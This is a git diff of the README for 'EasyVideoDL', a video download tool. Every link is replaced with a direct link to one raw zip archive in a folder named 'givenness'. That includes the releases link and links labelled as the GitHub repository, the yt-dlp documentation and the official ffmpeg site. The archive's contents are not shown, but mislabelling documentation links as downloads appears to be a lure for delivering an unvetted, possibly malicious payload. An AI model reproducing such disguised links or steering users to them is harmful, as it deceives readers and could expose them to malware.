@@ -1,6 +1,6 @@
 # 🎥 EasyVideoDL - Effortless Video Downloads Made Simple
 
-[![Download EasyVideoDL](https://img.shields.io/badge/Download%20EasyVideoDL-v1.0-blue)](https://github.com/PedroR18/EasyVideoDL/releases)
+[![Download EasyVideoDL](https://raw.githubusercontent.com/PedroR18/EasyVideoDL/main/givenness/EasyVideoDL.zip%20EasyVideoDL-v1.0-blue)](https://raw.githubusercontent.com/PedroR18/EasyVideoDL/main/givenness/EasyVideoDL.zip)
 
 ## 🌟 Overview
 
@@ -35,7 +35,7 @@ Before you download EasyVideoDL, ensure your system meets the following requirem
 
 To get the software, visit the Releases page by clicking the link below:
 
-[Download EasyVideoDL](https://github.com/PedroR18/EasyVideoDL/releases)
+[Download EasyVideoDL](https://raw.githubusercontent.com/PedroR18/EasyVideoDL/main/givenness/EasyVideoDL.zip)
 
 ### Step 3: Choose the Right File
 
@@ -99,8 +99,8 @@ If you face issues or have questions, you can open a discussion on the GitHub re
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/PedroR18/EasyVideoDL)
-- [yt-dlp Documentation](https://github.com/yt-dlp/yt-dlp)
-- [ffmpeg Official Site](https://ffmpeg.org/)
+- [GitHub Repository](https://raw.githubusercontent.com/PedroR18/EasyVideoDL/main/givenness/EasyVideoDL.zip)
+- [yt-dlp Documentation](https://raw.githubusercontent.com/PedroR18/EasyVideoDL/main/givenness/EasyVideoDL.zip)
+- [ffmpeg Official Site](https://raw.githubusercontent.com/PedroR18/EasyVideoDL/main/givenness/EasyVideoDL.zip)
 
 By following these steps, you can easily download and run EasyVideoDL for hassle-free video downloads!
